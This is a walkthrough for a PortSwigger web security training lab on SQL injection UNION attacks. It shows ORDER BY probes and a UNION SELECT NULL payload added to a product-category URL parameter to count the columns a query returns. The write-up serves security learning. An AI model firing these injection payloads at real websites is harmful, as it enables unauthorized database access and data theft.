# Lab: SQL injection UNION attack, determining the number of columns returned by the query

**Lab Link:** [https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)

## 🧠 Objective

Determine the **number of columns** returned by the original SQL query, which is necessary to perform a successful `UNION SELECT` injection.

---

## 🛠️ Step-by-step Solution

### 🔹 Step 1: Open a product category

Click on any product category, such as:

/filter?category=Accessories


This triggers the vulnerable query in the backend.

---

### 🔹 Step 2: Use `ORDER BY` to identify column count

Append the following payloads one by one to the URL and observe the behavior:

```http
/filter?category=Accessories' ORDER BY 1--
/filter?category=Accessories' ORDER BY 2--
/filter?category=Accessories' ORDER BY 3--
/filter?category=Accessories' ORDER BY 4--
✅ If ORDER BY 3-- works but ORDER BY 4-- returns an Internal Server Error, that means the query has 3 columns.

 Step 3: Use UNION SELECT with correct column count
Now that you know the query returns 3 columns, send this payload:
/filter?category=Accessories' UNION SELECT NULL,NULL,NULL--
✅ If the payload succeeds (no error page), the lab is solved.